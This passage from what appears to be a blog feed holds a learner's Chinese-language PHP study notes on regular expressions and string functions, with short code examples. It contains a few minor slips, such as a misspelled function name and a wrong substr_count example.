<span class="number">15</span>, <span class="title function_ invoke__">rand</span>(-<span class="number">5</span>, <span class="number">5</span>), <span class="title function_ invoke__">rand</span>(<span class="number">5</span>, <span class="number">60</span>), <span class="title function_ invoke__">rand</span>(<span class="number">15</span>, <span class="number">35</span>), <span class="variable">$color6</span>, <span class="variable">$fontfile</span>, <span class="variable">$str_all</span>);</span><br><span class="line"><span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$img</span>);</span><br><span class="line"><span class="title function_ invoke__">imagedestroy</span>(<span class="variable">$img</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP学习日志-005</title>
      <link href="/2023/02/24/PHP-Study-005/"/>
      <url>/2023/02/24/PHP-Study-005/</url>
      
        <content type="html"><![CDATA[<p>正则表达式</p><span id="more"></span><h1 id="正则表达式-PCRE"><a href="#正则表达式-PCRE" class="headerlink" title="正则表达式(PCRE)"></a>正则表达式(PCRE)</h1><p>引入</p><blockquote><p>正则表达式(regular expression)描述了一种字符串匹配的模式，可以用来检查一个串是否含有某种子串、将匹配的子串做替换或者从某个串中取出符合某个条件的子串等。</p></blockquote><h2 id="语法规则"><a href="#语法规则" class="headerlink" title="语法规则"></a>语法规则</h2><p>正则表达式描述了一类字符串的特征。由普通字符和特殊字符组成的字符串.</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;/a/&#x27;</span></span><br><span class="line"><span class="comment">// 正则表达式&#x27;/a/&#x27;</span></span><br><span class="line"><span class="comment">// 定界符：/</span></span><br><span class="line"><span class="comment">// 普通字符:a</span></span><br><span class="line"><span class="comment">// 元字符（上面式子没有）: * + ？ 等</span></span><br></pre></td></tr></table></figure><h2 id="定界符"><a href="#定界符" class="headerlink" title="定界符"></a>定界符</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 习惯性使用的是正斜线 /</span></span><br><span class="line"><span class="comment">// 还有下面的也是可以的，不过前后必须一致</span></span><br><span class="line"><span class="comment">#,!,&#123;&#125;,|</span></span><br><span class="line"><span class="comment">// 除了字母数字反斜线，其他的都可以作为定界符。</span></span><br></pre></td></tr></table></figure><h2 id="普通字符"><a href="#普通字符" class="headerlink" title="普通字符"></a>普通字符</h2><p>普通字符没有特殊意义</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a-z A-Z <span class="number">0</span>-<span class="number">9</span> <span class="string">&quot;&quot;</span> <span class="string">&#x27;&#x27;</span>等，不用转义字符转义。</span><br></pre></td></tr></table></figure><h2 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h2><table><thead><tr><th>字符</th><th>描述</th></tr></thead><tbody><tr><td>\</td><td>转义字符，使符号正常输出或者使用特殊字符</td></tr><tr><td>^</td><td>匹配输入字符串的 <strong>开始位置</strong> 。<br>如果是出现&#39;\n&#39;的话，每一个&#39;\n&#39;产生的新的一行都算是 <strong>新的一行</strong> ，匹配时都每个&#39;\n&#39;的行首都会被这配对的规则 <strong>匹配</strong> ！</td></tr><tr><td>$</td><td>匹配输入字符串的 <strong>结束位置</strong> 。</td></tr><tr><td>*</td><td>匹配前面的子表达式 <strong>零次</strong> 或 <strong>多次</strong> 。<br>例如，zo* 能匹配 &quot;z&quot; 以及 &quot;zoo&quot;。* 等价于{0,}。</td></tr><tr><td>+</td><td>匹配前面的子表达式 <strong>一次</strong> 或 <strong>多次</strong> 。<br>例如，&#39;zo+&#39; 能匹配 &quot;zo&quot; 以及 &quot;zoo&quot;，但不能匹配 &quot;z&quot;。+ 等价于 {1,}。</td></tr><tr><td>?</td><td>匹配前面的子表达式 <strong>零次</strong> 或 <strong>一次</strong> 。<br>例如，&quot;do(es)?&quot; 可以匹配 &quot;do&quot; 或 &quot;does&quot; 。? 等价于 {0,1}。</td></tr><tr><td>{n}</td><td>n 是一个 <strong>非负整数</strong> 。匹配 <strong>确定的n次</strong> 。<br>例如，’o{2}’ 不能匹配 &quot;Bob&quot; 中的 &#39;o&#39;，但是能匹配 &quot;food&quot; 中的两个 o。</td></tr><tr><td>{n,}</td><td>n 是一个 <strong>非负整数</strong> 。 <strong>至少匹配n次</strong> 。<br>例如，’o{2,}’ 不能匹配 &quot;Bob&quot; 中的 &#39;o&#39;，但能匹配 &quot;foooood&quot; 中的所有 o。&#39;o{1,}&#39; 等价于 &#39;o+&#39;。&#39;o{0,}&#39; 则等价于 ‘o*’。</td></tr><tr><td>{n,m}</td><td>m 和 n 均为 <strong>非负整数</strong> ，其中 n &lt;= m。<br> <strong>最少匹配 n 次</strong> 且 <strong>最多匹配 m 次</strong> 。<br>例如，&quot;o{1,3}&quot; 将匹配 &quot;fooooood&quot; 中的前三个 o。&#39;o{0,1}&#39; 等价于 &#39;o?&#39;。请注意在逗号和两个数之间不能有空格。</td></tr><tr><td>?</td><td>当该字符 <strong>紧跟</strong> 在任何一个 <strong>其他限制符</strong> (*, +, ?, {n}, {n,}, {n,m}) 后面时，匹配模式是 <strong>非贪婪</strong> 的。<br><strong>非贪婪模式</strong> 尽可能 <strong>少</strong> 的匹配所搜索的字符串，<br>而默认的 <strong>贪婪模式</strong> 则尽可能多的匹配所搜索的字符串。<br>例如，对于字符串 &quot;oooo&quot;，&#39;o+?&#39; 将匹配单个 &quot;o&quot;，而 &#39;o+&#39; 将匹配所有 &#39;o&#39;。<br>再举个常见的例子：<br><strong>贪婪匹配</strong> ：.*<br><strong>惰性匹配</strong> ：.*?</td></tr><tr><td><strong>.</strong></td><td>匹配 <strong>除换行符</strong> （\n、\r）之外的 <strong>任何单个字符</strong> 。要匹配包括 ‘\n’ 在内的任何字符，请使用像”(.|\n)”的模式。(也就是使用了或语法，使得能匹配所有的字符……)</td></tr><tr><td>(pattern)</td><td>匹配 pattern 并获取这一匹配。所获取的匹配可以从产生的 Matches 集合得到，在VBScript 中使用 SubMatches 集合，在JScript 中则使用 $0…$9 属性。要匹配圆括号字符，请使用 &#39;\(&#39; 或 &#39;\)&#39;。<br>括号，和其数学算术的差不多，独立出来，相当于独立空间了。<br>下面的\\num就是对括号的一个补充。</td></tr><tr><td>\\num</td><td>匹配 num，其中 num 是一个 <strong>正整数</strong> 。对所获取的匹配的引用。<br>例如，&#39;(.)\\1&#39; 匹配的是第一个圆括号所匹配到的内容，对应的值两个连续的相同字符。可以用来匹配网页标签。<br> <strong>具体示范</strong> 在下面有。</td></tr><tr><td>(?:pattern)</td><td>匹配 pattern 但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用 &quot;或&quot; 字符 (|) 来组合一个模式的各个部分是很有用。例如， &#39;industr(?:y|ies) 就是一个比 &#39;industry|industries&#39; 更简略的表达式。</td></tr><tr><td>(?=pattern)</td><td>正向肯定预查（look ahead positive assert），在任何匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取 <strong>供以后使用</strong> 。例如，&quot;Windows(?=95|98|NT|2000)&quot;能匹配&quot;Windows2000&quot;中的&quot;Windows&quot;，但不能匹配&quot;Windows3.1&quot;中的&quot;Windows&quot;。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。<br>这个看文字理解很有难度，其实说简单点，查到了，我存着，要用再调用。正则表达式是通用的，python也有这个语法。</td></tr><tr><td>(?!pattern)</td><td>正向否定预查(negative assert)，在任何不匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如&quot;Windows(?!95|98|NT|2000)&quot;能匹配&quot;Windows3.1&quot;中的&quot;Windows&quot;，但不能匹配&quot;Windows2000&quot;中的&quot;Windows&quot;。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。</td></tr><tr><td>(?&lt;=pattern)</td><td>反向(look behind)肯定预查，与正向肯定预查类似，只是方向相反。例如，”(?&lt;=95|98|NT|2000)Windows&quot;能匹配&quot;2000Windows&quot;中的&quot;Windows&quot;，但不能匹配&quot;3.1Windows&quot;中的”Windows”。</td></tr><tr><td>(?&lt;!pattern)</td><td>反向否定预查，与正向否定预查类似，只是方向相反。例如”(?&lt;!95 |\98|NT|2000)Windows&quot;能匹配&quot;3.1Windows&quot;中的&quot;Windows&quot;，但不能匹配&quot;2000Windows&quot;中的&quot;Windows&quot;。</td></tr><tr><td>x|y</td><td>匹配 x 或 y。<br>例如，&#39;z|food&#39; 能匹配 &quot;z&quot; 或 &quot;food&quot;。&#39;(z|f)ood&#39; 则匹配 &quot;zood&quot; 或 “food”。</td></tr><tr><td>[xyz]</td><td>字符集合。匹配所包含的任意一个字符。<br>例如， &#39;[abc]&#39; 可以匹配 &quot;plain&quot; 中的 &#39;a&#39;。</td></tr><tr><td>[^xyz]</td><td>负值字符集合。匹配未包含的任意字符。<br>例如， &#39;[^abc]&#39; 可以匹配 &quot;plain&quot; 中的&#39;p&#39;、&#39;l&#39;、&#39;i&#39;、&#39;n&#39;。</td></tr><tr><td>[a-z]</td><td><strong>字符范围</strong> 。匹配 <strong>指定范围内</strong> 的任意字符。<br>例如，&#39;[a-z]&#39; 可以匹配 &#39;a&#39; 到 &#39;z&#39; 范围内的任意小写字母字符。</td></tr><tr><td>[^a-z]</td><td><strong>负值字符范围</strong> 。匹配 <strong>任何不在指定范围内</strong> 的任意字符。<br>例如，&#39;[^a-z]&#39; 可以匹配任何不在 &#39;a&#39; 到 &#39;z&#39; 范围内的任意字符。</td></tr><tr><td>\cx</td><td>匹配由 x 指明的控制字符。<br>例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 &#39;c&#39; 字符。</td></tr><tr><td>\f</td><td>匹配一个换页符。等价于 \x0c 和 \cL。</td></tr><tr><td>\n</td><td>匹配一个换行符。等价于 \x0a 和 \cJ。换行上面也有提到，是另外起一行的意思，每行都会被^的行首匹配到。&gt;<br>说的再清晰点， <strong>^ 匹配的地方，就是\n的后面那部分</strong> 后面即开头嘛。</td></tr><tr><td>\r</td><td>匹配一个 <strong>回车符</strong> 。等价于 \x0d 和 \cM。</td></tr><tr><td>\b</td><td>匹配一个 <strong>单词边界</strong> ，也就是指单词和空格间的位置。<br>例如， &#39;er\b&#39; 可以匹配&quot;never&quot; 中的 &#39;er&#39;，但不能匹配 &quot;verb&quot; 中的 &#39;er&#39;。</td></tr><tr><td>\B</td><td>匹配 <strong>非单词边界</strong> 。&#39;er\B&#39; 能匹配 &quot;verb&quot; 中的 &#39;er&#39;，但不能匹配 &quot;never&quot; 中的 &#39;er&#39;。</td></tr><tr><td>\d</td><td>匹配一个 <strong>数字字符</strong> 。等价于 [0-9]。</td></tr><tr><td>\D</td><td>匹配一个 <strong>非数字字符</strong> 。等价于 [^0-9]。</td></tr><tr><td>\s</td><td>匹配任何 <strong>空白字符</strong> ，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。</td></tr><tr><td>\S</td><td>匹配任何 <strong>非空白字符</strong> 。等价于 [^ \f\n\r\t\v]。</td></tr><tr><td>\w</td><td>匹配 <strong>字母、数字、下划线</strong> 。等价于&#39;[A-Za-z0-9_]&#39;。</td></tr><tr><td>\W</td><td>匹配 <strong>非字母、数字、下划线</strong> 。等价于 &#39;[^A-Za-z0-9_]&#39;。</td></tr><tr><td>\t</td><td>匹配一个 <strong>制表符</strong> 。等价于 \x09 和 \cI。</td></tr><tr><td>\v</td><td>匹配一个垂直制表符。等价于 \x0b 和 \cK。</td></tr><tr><td>\xn</td><td>匹配 n，其中 n 为十六进制转义值。十六进制转义值必须为确定的两个数字长。<br>例如，&#39;\x41&#39; 匹配 &quot;A&quot;。&#39;\x041&#39; 则等价于 &#39;\x04&#39; &amp; &quot;1&quot;。正则表达式中可以使用 ASCII 编码。</td></tr><tr><td>\n</td><td>标识一个八进制转义值或一个向后引用。如果 \n 之前至少 n 个获取的子表达式，则 n 为向后引用。否则，如果 n 为八进制数字 (0-7)，则 n 为一个八进制转义值。</td></tr><tr><td>\nm</td><td>标识一个八进制转义值或一个向后引用。如果 \nm 之前至少有 nm 个获得子表达式，则 nm 为向后引用。如果 \nm 之前至少有 n 个获取，则 n 为一个后跟文字 m 的向后引用。如果前面的条件都不满足，若 n 和 m 均为八进制数字 (0-7)，则 \nm 将匹配八进制转义值 nm。</td></tr><tr><td>\nml</td><td>如果 n 为八进制数字 (0-3)，且 m 和 l 均为八进制数字 (0-7)，则匹配八进制转义值 nml。</td></tr><tr><td>\un</td><td>匹配 n，其中 n 是一个用四个十六进制数字表示的 Unicode 字符。<br>例如， \u00A9 匹配版权符号 (?)。</td></tr></tbody></table><h3 id="圆括号匹配"><a href="#圆括号匹配" class="headerlink" title="圆括号匹配"></a>圆括号匹配</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">关于 (元素)... \\<span class="number">1</span> 的成对匹配的匹配模式理解如下</span><br><span class="line"></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/&lt;([a-zA-Z]*)&gt;[a-zA-Z\s\S]*?&lt;\/\\1&gt;/&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;&lt;div&gt;Hello world!&lt;/div&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$pattern</span>, <span class="variable">$str</span>, <span class="variable">$arr</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$arr</span>);</span><br><span class="line"></span><br><span class="line">返回结果：</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; &lt;div&gt;Hello world!&lt;/div&gt;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    [<span class="number">1</span>] =&gt; <span class="title function_ invoke__">Array</span></span><br><span class="line">        (</span><br><span class="line">            [<span class="number">0</span>] =&gt; div</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="正则表达式-修饰符"><a href="#正则表达式-修饰符" class="headerlink" title="正则表达式-修饰符"></a>正则表达式-修饰符</h2><p>模式修正符是在正则表达式的定界符之后使用的，可以调整正则表达式的解释，扩展正则表达式在匹配、替换等操作时的某些功能，增强正则表达式的处理能力。</p><p>常见模式修饰符</p><blockquote><p><strong>i</strong> : 在和模式进行匹配时不区分大小写<br><strong>m</strong> : 多行匹配，如果目标字符串 中没有 <strong>“\n”</strong> 字符,或者模式中没有出现 <strong>^或$</strong> ,设置这个修饰符 <strong>不产生任何影响</strong><br><strong>s</strong> : 如果设定了此修正符，那么&quot;.&quot;将匹配所有的字符包括换行符<br><strong>U</strong> : 禁止贪婪匹配</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">模式修正符放置的位置：放在正则表达式最后一个定界符的后面</span><br><span class="line">如下,调用修正符i，使得匹配结果不区分大小写：</span><br><span class="line"><span class="variable">$regula</span> = <span class="string">&#x27;/test/i&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="与正则表达式配合的函数"><a href="#与正则表达式配合的函数" class="headerlink" title="与正则表达式配合的函数"></a>与正则表达式配合的函数</h2><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>preg_filter</td><td>执行一个正则表达式搜索和替换</td></tr><tr><td>preg_grep</td><td>返回匹配模式的数组条目</td></tr><tr><td>preg_last_error</td><td>返回最后一个PCRE正则执行产生的错误代码</td></tr><tr><td>preg_match_all</td><td>执行一个全局正则表达式匹配</td></tr><tr><td>preg_match</td><td>执行一个正则表达式匹配</td></tr><tr><td>preg_quote</td><td>转义正则表达式字符</td></tr><tr><td>preg_replace_callback_array</td><td>执行一个正则表达式搜索并且使用一个回调进行替换</td></tr><tr><td>preg_replace_callback</td><td>执行一个正则表达式搜索并且使用一个回调进行替换</td></tr><tr><td>preg_replace</td><td>执行一个正则表达式的搜索和替换</td></tr><tr><td>preg_split</td><td>通过一个正则表达式分隔字符串</td></tr></tbody></table><h3 id="搜索替换"><a href="#搜索替换" class="headerlink" title="搜索替换"></a>搜索替换</h3><p>目的是使用正则表达式替换掉后面的原始字符串。</p><p><strong>preg_filter</strong> (“正则表达式”,”替换字符串”,”原始字符串”);</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_fileter</span>(<span class="string">&quot;/\d/&quot;</span>,<span class="string">&quot;A&quot;</span>,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"><span class="comment">// 返回：AAA</span></span><br><span class="line">这个函数还能匹配数组，暂时略过。</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="匹配所有的符合正则表达式的数据"><a href="#匹配所有的符合正则表达式的数据" class="headerlink" title="匹配所有的符合正则表达式的数据"></a>匹配所有的符合正则表达式的数据</h3><p><strong>preg_match_all</strong> (“正则表达式”,”原始字符串”[,$arr[,$flags[,$offset]]]);</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$arr</span>是存储结果的数组。</span><br><span class="line"><span class="variable">$flags</span>=PREG_OFFSET_CAPTURE\(预定义常量，返回正则表达式匹配结果的下标，会存储在同一个字符串当中。他们称它 偏移量 \);</span><br><span class="line"><span class="variable">$offset</span>是控制查询的起始位置的，且单位为字节。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>$flags的参数被称为 <strong>PREG 常量</strong> ，具体请参照<a href="https://www.runoob.com/php/php-variable-handling-functions.html">菜鸟教程</a></p><h3 id="搜索和替换-preg-replace"><a href="#搜索和替换-preg-replace" class="headerlink" title="搜索和替换(preg_replace)"></a>搜索和替换(preg_replace)</h3><p><strong>preg_replace</strong> ：搜索和替换 <strong>所有</strong> 的符合正则表达式的字符串，一般前面无法直接解决的直接使用这个。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">参数<span class="number">1</span>：正则表达式</span><br><span class="line">参数<span class="number">2</span>：要替换成的字符串</span><br><span class="line">参数<span class="number">3</span>：目标字符串</span><br><span class="line">剩下是可选参数</span><br><span class="line">参数<span class="number">4</span>：匹配次数，默认-<span class="number">1</span>（无限次）</span><br><span class="line">参数<span class="number">5</span>：存储可匹配的次数，是一个变量。也就是替换了几次这里就显示几次。</span><br><span class="line"></span><br><span class="line"><span class="variable">$str2</span> = <span class="string">&#x27;wewewew  &lt;div&gt;123eewwees&lt;/div&gt;  cwwe&#x27;</span>;</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;#&lt;div&gt;.*?&lt;/div&gt;#m&#x27;</span>;</span><br><span class="line"><span class="variable">$str1</span> = <span class="string">&#x27;&lt;a&gt;前路漫漫&lt;/a&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">// $str1可以使用&#x27;&lt;a&gt;\\1&lt;/a&gt;&#x27;的形式获取前面圆括号匹配成功的字符串</span></span><br><span class="line"><span class="variable">$strs1</span> = <span class="string">&#x27;www&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$str2</span>, <span class="variable">$arr</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$arr</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>, <span class="variable">$str1</span>, <span class="variable">$str2</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;对不起，没找到！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$str2</span>);</span><br><span class="line"><span class="comment">// 返回显示</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">21</span>) <span class="string">&quot;&lt;div&gt;123eewwees&lt;/div&gt;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">string</span>(<span class="number">34</span>) <span class="string">&quot;wewewew  &lt;a&gt;前路漫漫&lt;/a&gt;  cwwe&quot;</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">36</span>) <span class="string">&quot;wewewew  &lt;div&gt;123eewwees&lt;/div&gt;  cwwe&quot;</span></span><br></pre></td></tr></table></figure><p>这里，引用下官网的解释</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$pattern</span>,</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$replacement</span>,</span><br><span class="line">    <span class="keyword">string</span>|<span class="keyword">array</span> <span class="variable">$subject</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span>,</span><br><span class="line">    <span class="keyword">int</span> &amp;<span class="variable">$count</span> = <span class="literal">null</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="variable">$replacement</span></span><br><span class="line">    用于替换的字符串或字符串数组。</span><br><span class="line">    如果这个参数是一个字符串，并且 pattern 是一个数组，那么所有的模式都使用这个字符串进行替换。</span><br><span class="line">    如果 pattern 和 replacement 都是数组，每个 pattern 使用 replacement 中对应的元素进行替换。（这点很重要）</span><br><span class="line">    如果 replacement 中的元素比 pattern 中的少，多出来的 pattern 使用空字符串进行替换。</span><br><span class="line"></span><br><span class="line">    replacement 中可以包含后向引用 \\n 或 <span class="variable">$n</span>，语法上首选后者。 </span><br><span class="line">    每个这样的引用将被匹配到的第 n 个捕获子组捕获到的文本替换。 n 可以是<span class="number">0</span>-<span class="number">99</span>，\\<span class="number">0</span> 和 $<span class="number">0</span> 代表完整的模式匹配文本。捕获子组的序号计数方式为：代表捕获子组的左括号从左到右， 从<span class="number">1</span>开始数。</span><br><span class="line">    如果要在 replacement 中使用反斜线，必须使用 <span class="number">4</span> 个(<span class="string">&quot;\\\\&quot;</span>，译注：因为这首先是 PHP 的字符串，经过转义后，是两个，再经过正则表达式引擎后才被认为是一个原文反斜线)。 </span><br><span class="line"></span><br><span class="line">    当在替换模式下工作并且后向引用后面紧跟着需要是另外一个数字 (比如：在一个匹配模式后紧接着增加一个原文数字)，不能使用 \\<span class="number">1</span> 这样的语法来描述后向引用。比如，\\<span class="number">11</span>将会使<span class="title function_ invoke__">preg_replace</span>() 不能理解你希望的是一个 \\<span class="number">1</span> 后向引用紧跟一个原文 <span class="number">1</span>，还是一个 \\<span class="number">11</span> 后向引用后面不跟任何东西。 这种情况下解决方案是使用 $&#123;<span class="number">1</span>&#125;<span class="number">1</span>。这创建了一个独立的 $<span class="number">1</span> 后向引用, 一个独立的原文 <span class="number">1</span>。</span><br><span class="line">    (个人看法：从上面的释义可以衍生出一个东西：使用\\<span class="number">1</span>或者$<span class="number">1</span>时，最好带上&#123;&#125;,避免歧义。)</span><br><span class="line"></span><br><span class="line">limit</span><br><span class="line">    每个模式在每个 subject 上进行替换的最大次数。默认是 -<span class="number">1</span>(无限)。</span><br><span class="line">count</span><br><span class="line">    如果指定，将会被填充为完成的替换次数。</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP学习日志-004</title>
      <link href="/2023/02/24/PHP-Study-004/"/>
      <url>/2023/02/24/PHP-Study-004/</url>
      
        <content type="html"><![CDATA[<p>字符串</p><span id="more"></span><!-- 最好的蓝队要从熟悉红队攻击手段开始 --><h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><h2 id="去除空白或其他字符函数-trim-ltrim-rtrim"><a href="#去除空白或其他字符函数-trim-ltrim-rtrim" class="headerlink" title="去除空白或其他字符函数(trim,ltrim,rtrim)"></a>去除空白或其他字符函数(trim,ltrim,rtrim)</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 不会改变原始字符串</span></span><br><span class="line"><span class="comment">// 去除首尾空白字符串</span></span><br><span class="line"><span class="title function_ invoke__">trim</span>(<span class="variable">$str</span>[,<span class="variable">$charlist</span>]);</span><br><span class="line"><span class="comment">// 第二个关键字不指定时:去除下面的字符串</span></span><br><span class="line"><span class="string">&quot; &quot;</span>     :普通空格符</span><br><span class="line"><span class="string">&quot;\t&quot;</span>    :制表符</span><br><span class="line"><span class="string">&quot;\n&quot;</span>    :换行符</span><br><span class="line"><span class="string">&quot;\r&quot;</span>    :回车符</span><br><span class="line"><span class="string">&quot;\0&quot;</span>    :空字节符</span><br><span class="line"><span class="string">&quot;\x0B&quot;</span>  :垂直制表符</span><br><span class="line"><span class="comment">// 例如:</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">trim</span>(<span class="string">&quot;  hello,world  &quot;</span>) <span class="comment">// =&gt;输出hello,world,左右没有空格 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定第二个参数,它的含义就变化为:去除字符串的前后指定字符串</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">trim</span>(<span class="string">&quot;hello,world&quot;</span>,<span class="string">&quot;h&quot;</span>) <span class="comment">// =&gt;输出ello,world,相当于去除首尾的&quot;h&quot; </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 同时去除首位的多个字符串</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">trim</span>(<span class="string">&quot;34ssddfcs&quot;</span>, <span class="string">&quot;3s&quot;</span>);<span class="comment">// =&gt; 输出4ssddfc</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意!去除字符串的方式是去除所有的限定字符串,没有去除个数的限制!</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">trim</span>(<span class="string">&quot;abcacdefcda&quot;</span>, <span class="string">&quot;abc&quot;</span>); <span class="comment">// =&gt; 输出defcd</span></span><br><span class="line"></span><br><span class="line">ltrim,rtrim <span class="comment">// 去除指定的首/尾(左/右)字符串</span></span><br></pre></td></tr></table></figure><h2 id="大小写转换函数-strtoupper-strtolower"><a href="#大小写转换函数-strtoupper-strtolower" class="headerlink" title="大小写转换函数(strtoupper,strtolower)"></a>大小写转换函数(strtoupper,strtolower)</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 转换全部字符串为大写</span></span><br><span class="line"><span class="title function_ invoke__">strtoupper</span>()</span><br><span class="line"><span class="comment">// 转换全部字符串为小写</span></span><br><span class="line"><span class="title function_ invoke__">strtolower</span>()</span><br></pre></td></tr></table></figure><h2 id="字符串查找函数-substr-count-strpos-strstr"><a href="#字符串查找函数-substr-count-strpos-strstr" class="headerlink" title="字符串查找函数(substr_count,strpos,strstr)"></a>字符串查找函数(substr_count,strpos,strstr)</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 返回$needl字符串在$haystack出现的次数</span></span><br><span class="line"><span class="comment">// string $haystack : 被搜索字符串</span></span><br><span class="line"><span class="comment">// string $needle   : 想要搜索出的某字符串</span></span><br><span class="line"><span class="comment">// int $offset=0    : 开始计数的偏移位置</span></span><br><span class="line"><span class="comment">// int $length      : 指定偏移位置后的最大搜索长度,加上$offset大于haystack时出警告</span></span><br><span class="line"><span class="comment">// ---</span></span><br><span class="line"><span class="comment">// [,int $offset=0[,int $length]]理解起来,就是从$offset开始计算$length个字符串,在这范围内查指定字符串</span></span><br><span class="line"><span class="comment">// 初始的范围依然时从0到长度-1的整数</span></span><br><span class="line"><span class="comment">// 不计算重叠字符串(例如在gcdgcdgcd搜索gcd,返回的次数只有1次)</span></span><br><span class="line"><span class="title function_ invoke__">substr_count</span>(<span class="keyword">string</span> <span class="variable">$haystack</span>,<span class="keyword">string</span> <span class="variable">$needle</span>[,<span class="keyword">int</span> <span class="variable">$offset</span>=<span class="number">0</span>[,<span class="keyword">int</span> <span class="variable">$length</span>]])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 查找字符串首次出现位置的索引值</span></span><br><span class="line"><span class="comment">// string $haystack,string $needle : 和上面的一样.</span></span><br><span class="line"><span class="comment">// 找不到返回false,找得到返回它的第一个的下标值</span></span><br><span class="line"><span class="title function_ invoke__">strpos</span>(<span class="keyword">string</span> <span class="variable">$haystack</span>,<span class="keyword">string</span> <span class="variable">$needle</span>[,<span class="keyword">int</span> <span class="variable">$offset</span>=<span class="number">0</span>])</span><br><span class="line"><span class="comment">// int $offset=0 : 控制查找的起始字符串位置,查找出来的下标是相对于$haystack的   </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 截取字符串</span></span><br><span class="line"><span class="comment">// 没带上第三个参数时:</span></span><br><span class="line"><span class="comment">// 查找字符串$needle的首次出现的位置,并且从该位置开始截取后面的所有字符串</span></span><br><span class="line"><span class="comment">// 第三个参数为true时:返回的是搜索参数前面的所有参数</span></span><br><span class="line"><span class="title function_ invoke__">strstr</span>(<span class="keyword">string</span> <span class="variable">$haystack</span>,<span class="keyword">string</span> <span class="variable">$needle</span>[,<span class="keyword">bool</span> <span class="variable">$before_needle</span>])</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strstr</span>(<span class="string">&quot;adbbfa1dsxf&quot;</span>, <span 